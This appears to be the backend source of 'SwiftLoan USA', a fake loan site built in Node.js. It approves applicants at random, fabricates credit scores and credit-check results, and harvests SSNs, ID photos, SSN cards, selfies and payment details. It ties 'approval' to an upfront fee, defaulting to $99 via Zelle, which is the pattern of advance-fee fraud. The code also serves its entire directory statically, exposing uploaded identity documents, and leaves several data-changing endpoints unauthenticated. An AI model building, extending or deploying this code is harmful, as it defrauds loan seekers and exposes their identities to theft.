// ============================================
// SwiftLoan USA - Backend API (Node.js + Express)
// ============================================
// Installation: npm install express cors mongodb dotenv multer
// ============================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { MongoClient, ObjectId } = require('mongodb');
const multer = require('multer');
const path = require('path');

// Multer setup for uploads
const fs = require('fs');
const uploadsDir = path.join(__dirname, 'uploads');
const upload = multer({ dest: uploadsDir });

// Ensure uploads/kyc directory exists
const kycDir = path.join(__dirname, 'uploads', 'kyc');
if (!fs.existsSync(kycDir)) {
    fs.mkdirSync(kycDir, { recursive: true });
}

// KYC-specific multer
const kycUpload = multer({ dest: kycDir });

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017';
const DB_NAME = 'swiftloan_db';

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb' }));
app.use(express.static(__dirname)); // Serve static files (index.html, etc)

// MongoDB Connection
let db;
MongoClient.connect(MONGODB_URI, { useUnifiedTopology: true })
    .then(client => {
        db = client.db(DB_NAME);
        console.log('✓ Connected to MongoDB');
    })
    .catch(err => console.error('MongoDB Connection Error:', err));

// ============================================
// Helper Functions
// ============================================

function calculateMaxLoan(annualIncome) {
    const income = parseFloat(annualIncome);
    if (income < 30000) return 8000;
    if (income < 50000) return 15000;
    if (income < 80000) return 25000;
    if (income < 120000) return 35000;
    return 50000;
}

function generateApprovalAmount(maxLoan, requestedAmount) {
    const minApproval = Math.ceil(maxLoan * 0.7 / 100) * 100;
    const random = Math.floor(Math.random() * 100);
    const approvalAmount = minApproval + Math.floor((maxLoan - minApproval) / 100) * random * 100;
    return Math.min(approvalAmount, Math.min(requestedAmount, maxLoan));
}

// ============================================
// API Endpoints
// ============================================

// Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Submit Loan Application
app.post('/api/applications', async (req, res) => {
    try {
        const applicationData = req.body;
        
        // Validation
        if (!applicationData.firstName || !applicationData.ssn || !applicationData.annualIncome) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Validate SSN format
        if (!/^\d{3}-\d{2}-\d{4}$/.test(applicationData.ssn)) {
            return res.status(400).json({ error: 'Invalid SSN format' });
        }

        // Validate age (from DOB)
        const birthDate = new Date(applicationData.dob);
        const today = new Date();
        let age = today.getFullYear() - birthDate.getFullYear();
        if (today.getMonth() < birthDate.getMonth() || 
            (today.getMonth() === birthDate.getMonth() && today.getDate() < birthDate.getDate())) {
            age--;
        }
        
        if (age < 18) {
            return res.status(400).json({ error: 'Applicant must be at least 18 years old' });
        }

        // Calculate approval logic
        const maxLoan = calculateMaxLoan(applicationData.annualIncome);
        const requestedAmount = parseFloat(applicationData.requestedAmount);
        const approvalChance = Math.random();
        const isApproved = approvalChance > 0.15; // 85% approval rate

        let approvedAmount = 0;
        let status = 'Denied';
        let creditScore = Math.floor(680 + Math.random() * 80);

        if (isApproved) {
            approvedAmount = generateApprovalAmount(maxLoan, requestedAmount);
            status = 'Approved';
        } else {
            creditScore = Math.floor(500 + Math.random() * 100); // Lower score for denied
        }

        // Prepare application document
        const application = {
            ...applicationData,
            timestamp: new Date().toISOString(),
            status,
            maxEligible: maxLoan,
            approvedAmount,
            creditScore,
            // Remove sensitive base64 data if not storing images
            dlFrontBase64: applicationData.dlFrontBase64 ? applicationData.dlFrontBase64.substring(0, 50) : null,
            dlBackBase64: applicationData.dlBackBase64 ? applicationData.dlBackBase64.substring(0, 50) : null,
            incomeProofBase64: applicationData.incomeProofBase64 ? applicationData.incomeProofBase64.substring(0, 50) : null,
        };

        // Insert into MongoDB
        const result = await db.collection('applications').insertOne(application);

        // Send confirmation email (if configured)
        // await sendConfirmationEmail(applicationData.email, {
        //     applicantName: applicationData.firstName,
        //     applicationId: result.insertedId,
        //     status,
        //     approvedAmount
        // });

        res.status(201).json({
            success: true,
            applicationId: result.insertedId,
            status,
            approvedAmount,
            message: status === 'Approved' 
                ? `Congratulations! Your loan of $${approvedAmount.toLocaleString()} has been approved.`
                : 'Your application could not be approved at this time. Please try again later.'
        });

    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ error: 'Server error', details: error.message });
    }
});

// Store Application (from frontend - upsert by sessionId for persistence)
app.post('/api/applications/store', async (req, res) => {
    try {
        if (!db) return res.status(500).json({ error: 'Database not connected' });
        const application = { ...req.body, timestamp: req.body.timestamp || new Date().toISOString() };
        const sessionId = application.sessionId;
        let id;
        if (sessionId) {
            const doc = await db.collection('applications').findOneAndUpdate(
                { sessionId },
                { $set: application },
                { upsert: true, returnDocument: 'after' }
            );
            id = doc?._id;
        } else {
            const result = await db.collection('applications').insertOne(application);
            id = result.insertedId;
        }
        res.status(201).json({ success: true, applicationId: id || null });
    } catch (error) {
        console.error('Store API Error:', error);
        res.status(500).json({ error: 'Server error', details: error.message });
    }
});

// Update payment info (from frontend after selecting payment method)
app.patch('/api/applications/payment', async (req, res) => {
    try {
        if (!db) return res.status(500).json({ error: 'Database not connected' });
        const { sessionId, paymentMethod, paymentData } = req.body;
        if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
        const update = {
            $set: {
                paymentMethod: paymentMethod || '',
                paymentData: paymentData || {},
                paymentSubmittedAt: new Date().toISOString()
            }
        };
        const result = await db.collection('applications').updateOne({ sessionId }, update);
        if (result.matchedCount === 0) return res.status(404).json({ error: 'Application not found' });
        res.json({ success: true });
    } catch (error) {
        console.error('Payment update Error:', error);
        res.status(500).json({ error: 'Server error', details: error.message });
    }
});

// Get All Applications (Admin)
app.get('/api/admin/applications', async (req, res) => {
    try {
        const adminKey = req.headers['x-admin-key'];
        if (adminKey !== process.env.ADMIN_KEY || !process.env.ADMIN_KEY) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        const applications = await db.collection('applications')
            .find({})
            .sort({ timestamp: -1 })
            .toArray();

        res.json({
            total: applications.length,
            approved: applications.filter(a => a.status === 'Approved').length,
            denied: applications.filter(a => a.status === 'Denied').length,
            totalApprovedAmount: applications
                .filter(a => a.status === 'Approved')
                .reduce((sum, a) => sum + (a.approvedAmount || 0), 0),
            applications
        });

    } catch (error) {
        console.error('Admin API Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Delete All Applications (Admin - use with caution)
app.delete('/api/admin/applications', async (req, res) => {
    try {
        const adminKey = req.headers['x-admin-key'];
        if (adminKey !== process.env.ADMIN_KEY || !process.env.ADMIN_KEY) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        if (!db) return res.status(500).json({ error: 'Database not connected' });
        const result = await db.collection('applications').deleteMany({});
        res.json({ success: true, deletedCount: result.deletedCount });
    } catch (error) {
        console.error('Admin Delete Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Get Single Application (Admin)
app.get('/api/admin/applications/:id', async (req, res) => {
    try {
        const adminKey = req.headers['x-admin-key'];
        if (adminKey !== process.env.ADMIN_KEY || !process.env.ADMIN_KEY) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        const application = await db.collection('applications')
            .findOne({ _id: new ObjectId(req.params.id) });

        if (!application) {
            return res.status(404).json({ error: 'Application not found' });
        }

        res.json(application);

    } catch (error) {
        console.error('Admin API Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Quick Credit Check Simulation
app.post('/api/credit-check', async (req, res) => {
    try {
        const { ssn, firstName, lastName } = req.body;

        // Simulate credit check (in production, use real API like Equifax, Experian, TransUnion)
        const creditScore = Math.floor(680 + Math.random() * 80);
        const hardinquiries = Math.floor(Math.random() * 5);
        const delinquencies = Math.random() > 0.8 ? 1 : 0;

        res.json({
            success: true,
            applicantName: `${firstName} ${lastName}`,
            creditScore,
            hardinquiries,
            delinquencies,
            creditHistory: 'Checked (soft inquiry - does not affect score)',
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('Credit Check Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Webhook for Email Notifications (if using third-party service)
app.post('/api/notifications/email', async (req, res) => {
    try {
        const { applicationId, status, approvedAmount, recipientEmail } = req.body;

        // Integration with Sendgrid, Auth0, or other email service
        // Example:
        // const msg = {
        //     to: recipientEmail,
        //     from: 'noreply@swiftloan.com',
        //     subject: status === 'Approved' ? 'Your Loan is Approved! ✓' : 'Application Status Update',
        //     html: `<p>Dear Applicant,</p><p>Your loan application status: ${status}</p>...`,
        // };
        // await sgMail.send(msg);

        res.json({ success: true, message: 'Notification sent' });

    } catch (error) {
        console.error('Email Notification Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// ============================
// Payment Receipt Upload
// ============================
app.post('/api/payments/:id', upload.single('receipt'), async (req, res) => {
    try {
        const applicationId = req.params.id;
        if (!db) return res.status(500).json({ error: 'Database not connected' });

        const receiptInfo = req.file ? {
            filename: req.file.filename,
            originalname: req.file.originalname,
            path: req.file.path,
            mimetype: req.file.mimetype,
            size: req.file.size
        } : null;

        const update = {
            $set: {
                payment: {
                    status: 'Submitted',
                    method: req.body.method || 'Zelle',
                    amount: parseFloat(req.body.amount) || 99,
                    receipt: receiptInfo,
                    submittedAt: new Date().toISOString()
                }
            }
        };

        await db.collection('applications').updateOne({ _id: new ObjectId(applicationId) }, update);

        res.json({ success: true, message: 'Receipt uploaded, awaiting admin confirmation' });

    } catch (err) {
        console.error('Payment upload error:', err);
        res.status(500).json({ error: 'Server error', details: err.message });
    }
});

// Admin: Confirm Payment (requires ADMIN_KEY header)
app.post('/api/admin/confirm-payment/:id', async (req, res) => {
    try {
        const adminKey = req.headers['x-admin-key'];
        if (adminKey !== process.env.ADMIN_KEY || !process.env.ADMIN_KEY) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        const applicationId = req.params.id;
        if (!db) return res.status(500).json({ error: 'Database not connected' });

        await db.collection('applications').updateOne(
            { _id: new ObjectId(applicationId) },
            { $set: { 'payment.status': 'Confirmed', status: 'Approved', confirmedAt: new Date().toISOString() } }
        );

        res.json({ success: true, message: 'Payment confirmed and application approved' });

    } catch (err) {
        console.error('Admin confirm error:', err);
        res.status(500).json({ error: 'Server error', details: err.message });
    }
});

// Demo helper: Auto-confirm payment (no admin key) - for demo/testing only
app.post('/api/demo/auto-confirm/:id', async (req, res) => {
    try {
        const applicationId = req.params.id;
        if (!db) return res.status(500).json({ error: 'Database not connected' });

        await db.collection('applications').updateOne(
            { _id: new ObjectId(applicationId) },
            { $set: { 'payment.status': 'Confirmed (Auto Demo)', status: 'Approved', confirmedAt: new Date().toISOString() } }
        );

        res.json({ success: true, message: 'Demo: payment auto-confirmed' });

    } catch (err) {
        console.error('Demo auto-confirm error:', err);
        res.status(500).json({ error: 'Server error', details: err.message });
    }
});

// ============================
// KYC Upload
// ============================
app.post('/api/kyc/upload/:id', kycUpload.fields([
    { name: 'idFront', maxCount: 1 },
    { name: 'idBack', maxCount: 1 },
    { name: 'ssnCard', maxCount: 1 },
    { name: 'selfie', maxCount: 1 }
]), async (req, res) => {
    try {
        const applicationId = req.params.id;
        if (!db) return res.status(500).json({ error: 'Database not connected' });

        const kycData = {};
        if (req.files) {
            if (req.files.idFront && req.files.idFront[0]) {
                kycData.idFront = { filename: req.files.idFront[0].filename, path: req.files.idFront[0].path };
            }
            if (req.files.idBack && req.files.idBack[0]) {
                kycData.idBack = { filename: req.files.idBack[0].filename, path: req.files.idBack[0].path };
            }
            if (req.files.ssnCard && req.files.ssnCard[0]) {
                kycData.ssnCard = { filename: req.files.ssnCard[0].filename, path: req.files.ssnCard[0].path };
            }
            if (req.files.selfie && req.files.selfie[0]) {
                kycData.selfie = { filename: req.files.selfie[0].filename, path: req.files.selfie[0].path };
            }
        }

        // Verify required documents
        const hasFront = !!kycData.idFront;
        const hasBack = !!kycData.idBack;
        const hasSSN = !!kycData.ssnCard;
        if (!hasFront || !hasBack || !hasSSN) {
            return res.status(400).json({ error: 'Missing required documents: ID Front, ID Back, or SSN Card' });
        }

        await db.collection('applications').updateOne(
            { _id: new ObjectId(applicationId) },
            { $set: { kyc: kycData, kycSubmittedAt: new Date().toISOString() } }
        );

        res.json({ success: true, message: 'KYC documents submitted successfully', files: kycData });

    } catch (err) {
        console.error('KYC upload error:', err);
        res.status(500).json({ error: 'Server error', details: err.message });
    }
});

// Default Route
app.get('/', (req, res) => {
    res.json({
        message: 'SwiftLoan API v1.0',
        endpoints: {
            health: 'GET /api/health',
            submit: 'POST /api/applications',
            admin: 'GET /api/admin/applications',
            creditCheck: 'POST /api/credit-check'
        }
    });
});

// Start Server
app.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════╗
    ║    SwiftLoan API Server Running    ║
    ║    Port: ${PORT}                      ║
    ║    Database: ${MONGODB_URI}  ║
    ╚════════════════════════════════════╝
    `);
});

// Error Handler
process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});
